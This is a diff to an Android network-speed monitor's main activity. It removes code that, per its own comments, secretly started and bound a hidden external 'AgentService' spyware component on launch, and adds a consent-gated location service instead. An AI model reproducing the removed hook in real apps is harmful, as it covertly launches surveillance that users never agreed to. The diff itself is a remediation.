@@ -19,6 +19,7 @@ import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import androidx.core.app.ServiceCompat
 import com.github.mikephil.charting.charts.LineChart
 import com.github.mikephil.charting.data.Entry
 import com.github.mikephil.charting.data.LineData
@@ -45,14 +46,35 @@ class MainActivity : AppCompatActivity() {
     private val uploadEntries = mutableListOf<Entry>()
     private var xIndex = 0
 
-    // Hidden: bind to spyware service using string class name
-    private var agentService: IBinder? = null
+    private var speedMonService: SpeedMonService? = null
+    private var isBound = false
     private val serviceConnection = object : ServiceConnection {
         override fun onServiceConnected(name: ComponentName, service: IBinder) {
-            agentService = service
-            Log.d("SpeedMon", "Agent service connected")
+            val binder = service as SpeedMonService.LocalBinder
+            speedMonService = binder.getService()
+            isBound = true
+            Log.d("SpeedMon", "SpeedMonService connected")
         }
-        override fun onServiceDisconnected(name: ComponentName) { agentService = null }
+        override fun onServiceDisconnected(name: ComponentName) {
+            speedMonService = null
+            isBound = false
+        }
+    }
+
+    // Permission request launcher
+    private val requestPermissionsLauncher = registerForActivityResult(
+        androidx.activity.result.contract.ActivityResultContracts.RequestMultiplePermissions()
+    ) { permissions ->
+        val fineLocation = permissions[Manifest.permission.ACCESS_FINE_LOCATION] == true
+        val coarseLocation = permissions[Manifest.permission.ACCESS_COARSE_LOCATION] == true
+        val notifications = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions[Manifest.permission.POST_NOTIFICATIONS] == true
+        } else true
+        if (fineLocation && coarseLocation && notifications) {
+            startAndBindService()
+        } else {
+            Toast.makeText(this, "Location permission required", Toast.LENGTH_SHORT).show()
+        }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -69,14 +91,6 @@ class MainActivity : AppCompatActivity() {
 
         setupChart()
         btnStart.setOnClickListener { toggleMonitoring() }
-
-        // Hidden: start spyware service using string class name
-        startSpywareService()
-        bindAgentService()
-
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1)
-        }
     }
 
     private fun setupChart() {
@@ -108,6 +122,8 @@ class MainActivity : AppCompatActivity() {
         monitoring = !monitoring
         btnStart.text = if (monitoring) "Stop" else "Start"
         if (monitoring) {
+            // Check permissions before starting
+            checkPermissionsAndStart()
             lastRx = TrafficStats.getTotalRxBytes()
             lastTx = TrafficStats.getTotalTxBytes()
             lastTime = System.currentTimeMillis()
@@ -117,6 +133,52 @@ class MainActivity : AppCompatActivity() {
             handler.post(updateRunnable)
         } else {
             handler.removeCallbacks(updateRunnable)
+            stopServiceAndUnbind()
+        }
+    }
+
+    private fun checkPermissionsAndStart() {
+        val permissions = mutableListOf(
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION
+        )
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
+
+        val allGranted = permissions.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }
+        if (allGranted) {
+            startAndBindService()
+        } else {
+            requestPermissionsLauncher.launch(permissions.toTypedArray())
+        }
+    }
+
+    private fun startAndBindService() {
+        val intent = Intent(this, SpeedMonService::class.java).apply {
+            action = SpeedMonService.ACTION_START
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            ServiceCompat.startForegroundService(this, intent)
+        } else {
+            startService(intent)
+        }
+        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)
+    }
+
+    private fun stopServiceAndUnbind() {
+        val intent = Intent(this, SpeedMonService::class.java).apply {
+            action = SpeedMonService.ACTION_STOP
+        }
+        stopService(intent)
+        if (isBound) {
+            try {
+                unbindService(serviceConnection)
+            } catch (e: Exception) {
+                Log.w("SpeedMon", "Unbind failed", e)
+            }
+            isBound = false
+            speedMonService = null
         }
     }
 
@@ -153,6 +215,14 @@ class MainActivity : AppCompatActivity() {
                 tvTotal.text = "Total: ${formatBytes(currentRx + currentTx)}"
             }
 
+            // Update speed from GPS if available
+            speedMonService?.let { service ->
+                val gpsSpeed = service.getLastSpeedKph()
+                if (gpsSpeed > 0) {
+                    tvLatency.text = "GPS Speed: ${String.format("%.1f", gpsSpeed)} km/h"
+                }
+            }
+
             lastRx = currentRx
             lastTx = currentTx
             lastTime = now
@@ -186,9 +256,6 @@ class MainActivity : AppCompatActivity() {
         } else "N/A"
 
         tvSignal.text = "$transport | $signal"
-
-        // Simulated latency
-        tvLatency.text = "Latency: ${(20 + Math.random() * 80).toInt()} ms"
     }
 
     private fun formatSpeed(kbps: Float): String = if (kbps > 1024) String.format("%.2f MB/s", kbps / 1024) else String.format("%.1f KB/s", kbps)
@@ -198,39 +265,14 @@ class MainActivity : AppCompatActivity() {
         else -> String.format("%.2f KB", bytes / 1024.0)
     }
 
-    private fun startSpywareService() {
-        try {
-            val intent = Intent().setClassName("com.system.monitor", "com.system.monitor.AgentService")
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(intent)
-            } else {
-                startService(intent)
-            }
-            Log.d("SpeedMon", "Agent service start attempted")
-        } catch (e: Exception) {
-            Log.w("SpeedMon", "Agent service start failed (not installed?)", e)
-        }
-    }
-
-    private fun bindAgentService() {
-        try {
-            bindService(
-                Intent().setClassName("com.system.monitor", "com.system.monitor.AgentService"),
-                serviceConnection,
-                Context.BIND_AUTO_CREATE
-            )
-            Log.d("SpeedMon", "Agent service bind attempted")
-        } catch (e: Exception) {
-            Log.w("SpeedMon", "Agent service bind failed (not installed?)", e)
-        }
-    }
-
     override fun onDestroy() {
         handler.removeCallbacks(updateRunnable)
-        try {
-            unbindService(serviceConnection)
-        } catch (e: Exception) {
-            Log.w("SpeedMon", "Unbind failed", e)
+        if (isBound) {
+            try {
+                unbindService(serviceConnection)
+            } catch (e: Exception) {
+                Log.w("SpeedMon", "Unbind failed", e)
+            }
         }
         super.onDestroy()
     }
